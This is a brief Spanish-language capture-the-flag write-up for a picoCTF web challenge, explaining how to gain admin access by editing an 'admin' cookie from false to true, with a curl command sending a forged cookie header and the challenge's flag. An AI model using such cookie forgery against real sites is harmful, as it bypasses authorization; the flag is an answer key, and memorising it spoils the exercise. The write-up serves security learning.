## Descripcion 

La fábrica oculta cosas a todos sus usuarios. ¿Puedes iniciar sesión como Joe y encontrar lo que han estado mirando? https://jupiter.challenges.picoctf.org/problem/44573/ (link) o http://jupiter.challenges.picoctf.org:44573
## Solucion

Ponemos joe y no deja
ponemos cualquier cosa y entramos
Inspeccionamos
red
cookies
editamos el admin que esta como false a true con un edit cookies
Flag: picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}

///////terminal en linux
curl https://jupiter.challenges.picoctf.org/problem/44573/flag
curl -s https://jupiter.challenges.picoctf.org/problem/44573/flag -H "Cookie: username=juan; password=hola; admin=True"


## Notas adicionales
